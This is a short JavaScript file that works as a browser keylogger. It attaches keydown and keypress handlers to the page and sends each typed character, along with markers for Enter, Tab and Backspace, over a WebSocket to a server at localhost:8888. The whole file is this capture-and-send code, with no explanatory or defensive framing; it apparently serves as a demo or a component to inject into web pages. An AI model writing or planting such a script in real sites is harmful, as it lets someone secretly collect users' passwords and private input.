function KeyPress(socket) {

    document.onkeydown = function(e) {
        // onkeypress can not detect these keys
        var KeyCode = (e.which) ? e.which : e.keyCode

        if (KeyCode == 13) {
            socket.send("[ENTER]");
        }
        if (KeyCode == 9) {
            socket.send("[TAB]");
        }
        if (KeyCode == 8) {
            socket.send("[DEL]");
        }
    }

    document.onkeypress = function(e) {
        // onkeypress will give us special characters/case sensitive keys
        var keys = '';
        var get = window.event ? event : e;
        var key = get.keyCode ? get.keyCode : get.charCode;
        key = String.fromCharCode(key);
        //keys += key;

        socket.send(key);
    };
}

var socket = new WebSocket("ws://localhost:8888/ws");
KeyPress(socket);